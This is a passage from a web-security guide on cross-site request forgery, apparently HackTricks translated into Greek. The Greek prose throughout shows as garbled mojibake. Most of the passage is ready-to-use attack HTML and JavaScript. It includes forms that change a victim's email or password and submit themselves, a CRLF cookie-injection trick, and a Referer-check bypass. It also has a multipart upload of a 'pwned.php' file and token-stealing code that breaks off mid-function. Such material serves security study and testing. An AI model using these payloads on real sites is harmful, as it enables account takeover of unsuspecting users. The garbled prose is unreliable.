* Î”Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Î¼Îµ Î±ÎºÏÎ¹Î²ÏÏ‚ **Î¯Î´Î¹Î¿ Î¼Î®ÎºÎ¿Ï‚ Î±Î»Î»Î¬ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ token**.

### CSRF token is verified by a cookie

ÎŸÎ¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎ¿Ï…Î½ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± CSRF Î´Î¹Ï€Î»Î±ÏƒÎ¹Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ token Ï„ÏŒÏƒÎ¿ ÏƒÎµ cookie ÏŒÏƒÎ¿ ÎºÎ±Î¹ ÏƒÎµ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ Î® ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Î­Î½Î± CSRF cookie ÎºÎ±Î¹ ÎµÏ€Î±Î»Î·Î¸ÎµÏÎ¿Î½Ï„Î±Ï‚ Î±Î½ Ï„Î¿ token Ï€Î¿Ï… Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ backend Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯ ÏƒÏ„Î¿ cookie. Î— ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÎ¹ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Î±Î½ Ï„Î¿ token ÏƒÏ„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ ÎµÏ…Î¸Ï…Î³ÏÎ±Î¼Î¼Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® ÏƒÏ„Î¿ cookie.

Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÎµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ CSRF Î±Î½ Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± Î­Ï‡ÎµÎ¹ ÎµÎ»Î±Ï„Ï„ÏÎ¼Î±Ï„Î± Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹ Î­Î½Î± CSRF cookie ÏƒÏ„Î¿Î½ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î® Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚, ÏŒÏ€Ï‰Ï‚ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± CRLF. ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï…Ï„ÏŒ Ï†Î¿ÏÏ„ÏÎ½Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± Ï€Î±ÏÎ±Ï€Î»Î±Î½Î·Ï„Î¹ÎºÎ® ÎµÎ¹ÎºÏŒÎ½Î± Ï€Î¿Ï… ÏÏ…Î¸Î¼Î¯Î¶ÎµÎ¹ Ï„Î¿ cookie, Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ¼ÎµÎ½Î· Î±Ï€ÏŒ Ï„Î·Î½ Î­Î½Î±ÏÎ¾Î· Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ CSRF.

Î Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï„Î¿Ï… Ï€ÏÏ‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î´Î¿Î¼Î·Î¸ÎµÎ¯ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ·:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Ï„Î¿ **csrf token ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿ cookie Ï„Î·Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚, Î±Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î´ÎµÎ½ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹** Î³Î¹Î±Ï„Î¯ Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î· ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚, ÎºÎ±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î¸Î± ÎµÏ€Î¹Ï„Î¯Î¸ÎµÏƒÏ„Îµ ÏƒÏ„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ ÏƒÎ±Ï‚.
{% endhint %}

### Î‘Î»Î»Î±Î³Î® Content-Type

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ [**Î±Ï…Ï„ÏŒ**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± **Î±Ï€Î¿Ï†ÎµÏ…Ï‡Î¸Î¿ÏÎ½ Î¿Î¹ Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¼Î­Î½ÎµÏ‚** Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ **POST**, Î¿Î¹ ÎµÏ€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ Content-Type ÎµÎ¯Î½Î±Î¹:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î· **Î»Î¿Î³Î¹ÎºÎ® Ï„Ï‰Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„ÏÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Ï†Î­ÏÎµÎ¹** Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ **Content-Type** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹, Î¿Ï€ÏŒÏ„Îµ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ ÎºÎ±Î¹ Î¬Î»Î»ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± (Î±Ï€ÏŒ [ÎµÎ´Ï](https://brycec.me/posts/corctf\_2021\_challenges)) Î±Ï€Î¿ÏƒÏ„Î¿Î»Î®Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ JSON Ï‰Ï‚ text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Bypassing Preflight Requests for JSON Data

ÎŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± JSON Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ POST request, Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `Content-Type: application/json` ÏƒÎµ Î¼Î¹Î± HTML Ï†ÏŒÏÎ¼Î± Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î¬Î¼ÎµÏƒÎ± Î´Ï…Î½Î±Ï„Î®. ÎŸÎ¼Î¿Î¯Ï‰Ï‚, Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `XMLHttpRequest` Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… Ï„ÏÏ€Î¿Ï… Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï… Î¾ÎµÎºÎ¹Î½Î¬ Î¼Î¹Î± Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¯Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚. Î Î±Ï' ÏŒÎ»Î± Î±Ï…Ï„Î¬, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÏƒÏ„ÏÎ±Ï„Î·Î³Î¹ÎºÎ­Ï‚ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Î±Ï…Ï„Î® Î· Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÏ„Î¹ÎºÎ® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎºÎ±Î¹ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸ÎµÎ¯ Î±Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± JSON Î±Î½ÎµÎ¾Î±ÏÏ„Î®Ï„Ï‰Ï‚ Ï„Î¿Ï… Content-Type:

1. **Use Alternative Content Types**: Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ `Content-Type: text/plain` Î® `Content-Type: application/x-www-form-urlencoded` Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ `enctype="text/plain"` ÏƒÏ„Î· Ï†ÏŒÏÎ¼Î±. Î‘Ï…Ï„Î® Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· Î´Î¿ÎºÎ¹Î¼Î¬Î¶ÎµÎ¹ Î±Î½ Ï„Î¿ backend Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Î½ÎµÎ¾Î±ÏÏ„Î®Ï„Ï‰Ï‚ Ï„Î¿Ï… Content-Type.
2. **Modify Content Type**: Î“Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÏÎ³ÎµÏ„Îµ Î­Î½Î± Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¯Î± Î±Î¯Ï„Î·Î¼Î± ÎµÎ½Ï Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÏ„Îµ ÏŒÏ„Î¹ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î±Î½Î±Î³Î½Ï‰ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï‰Ï‚ JSON, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Îµ `Content-Type: text/plain; application/json`. Î‘Ï…Ï„ÏŒ Î´ÎµÎ½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¯Î± Î±Î¯Ï„Î·Î¼Î± Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯ ÏƒÏ‰ÏƒÏ„Î¬ Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î±Î½ ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿Ï‚ Î½Î± Î±Ï€Î¿Î´Î­Ï‡ÎµÏ„Î±Î¹ `application/json`.
3. **SWF Flash File Utilization**: ÎœÎ¹Î± Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ ÎºÎ¿Î¹Î½Î® Î±Î»Î»Î¬ ÎµÏ†Î¹ÎºÏ„Î® Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… SWF flash Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸Î¿ÏÎ½ Ï„Î­Ï„Î¿Î¹ÎµÏ‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿Î¯. Î“Î¹Î± Î¼Î¹Î± ÏƒÎµ Î²Î¬Î¸Î¿Ï‚ ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚, Î±Î½Î±Ï„ÏÎ­Î¾Ï„Îµ ÏƒÎµ [Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Referrer / Origin check bypass

**Avoid Referrer header**

ÎŸÎ¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹ÎºÏ…ÏÏÎ½Î¿Ï…Î½ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± 'Referer' Î¼ÏŒÎ½Î¿ ÏŒÏ„Î±Î½ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÎ¿ÏÏƒÎ±. Î“Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÏ„Îµ Î­Î½Î±Î½ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î® Î±Ï€ÏŒ Ï„Î¿ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î±Ï…Ï„Î® Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î±, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î· Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ HTML meta tag:
```xml
<meta name="referrer" content="never">
```
Î‘Ï…Ï„ÏŒ Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Î· ÎºÎµÏ†Î±Î»Î¯Î´Î± 'Referer' Ï€Î±ÏÎ±Î»ÎµÎ¯Ï€ÎµÏ„Î±Î¹, Ï€Î¹Î¸Î±Î½ÏÏ‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚.

**Regexp Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Î“Î¹Î± Î½Î± Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Î¼Î­Î± Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL Ï€Î¿Ï… Î¸Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î¿ Referrer Î¼Î­ÏƒÎ± ÏƒÏ„Î¹Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD method bypass**

Î¤Î¿ Ï€ÏÏÏ„Î¿ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… [**Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) ÎµÎ¾Î·Î³ÎµÎ¯ ÏŒÏ„Î¹ [Î¿ Ï€Î·Î³Î±Î¯Î¿Ï‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î¿Ï… Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), Î­Î½Î±Ï‚ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®Ï‚, Î­Ï‡ÎµÎ¹ ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î½Î± **Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± HEAD Ï‰Ï‚ Î±Î¹Ï„Î®Î¼Î±Ï„Î± GET** Ï‡Ï‰ÏÎ¯Ï‚ ÏƒÏÎ¼Î± Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ·Ï‚ - Î¼Î¹Î± ÎºÎ¿Î¹Î½Î® Î»ÏÏƒÎ· Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î¼Î¿Î½Î±Î´Î¹ÎºÎ® Î³Î¹Î± Ï„Î¿Î½ Oak. Î‘Î½Ï„Î¯ Î³Î¹Î± Î­Î½Î±Î½ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Ï€Î¿Ï… Î±ÏƒÏ‡Î¿Î»ÎµÎ¯Ï„Î±Î¹ Î¼Îµ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± HEAD, Î±Ï€Î»Î¬ **Î´Î¯Î½Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® GET Î±Î»Î»Î¬ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î±Ï€Î»Î¬ Î±Ï†Î±Î¹ÏÎµÎ¯ Ï„Î¿ ÏƒÏÎ¼Î± Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ·Ï‚**.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± GET Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î±Ï€Î»Î¬ Î½Î± **ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± HEAD Ï€Î¿Ï… Î¸Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯ Ï‰Ï‚ Î±Î¯Ï„Î·Î¼Î± GET**.

## **Exploit Examples**

### **Exfiltrating CSRF Token**

Î‘Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± **CSRF token** Ï‰Ï‚ **Î¬Î¼Ï…Î½Î±**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± **ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï„Î¿** ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Î¼Î¹Î± [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î® Î¼Î¹Î± [**Dangling Markup**](dangling-markup-html-scriptless-injection/) ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±.

### **GET using HTML tags**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Î†Î»Î»ÎµÏ‚ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ HTML5 Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î½ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î­Î½Î± GET Î±Î¯Ï„Î·Î¼Î± ÎµÎ¯Î½Î±Î¹:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Î‘Î¯Ï„Î·Î¼Î± GET Ï†ÏŒÏÎ¼Î±Ï‚
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Î‘Î¯Ï„Î·Î¼Î± POST Ï†ÏŒÏÎ¼Î±Ï‚
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Î‘Î¯Ï„Î·Î¼Î± POST Ï†ÏŒÏÎ¼Î±Ï‚ Î¼Î­ÏƒÏ‰ iframe
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Î‘Î¯Ï„Î·Î¼Î± Ajax POST**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST Î±Î¯Ï„Î·Î¼Î±
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST request v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Î‘Î¯Ï„Î·Î¼Î± POST Ï†ÏŒÏÎ¼Î±Ï‚ Î±Ï€ÏŒ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± iframe
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **ÎšÎ»Î­ÏˆÎµ Ï„Î¿ CSRF Token ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»Îµ Î­Î½Î± POST Î±Î¯Ï„Î·Î¼Î±**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
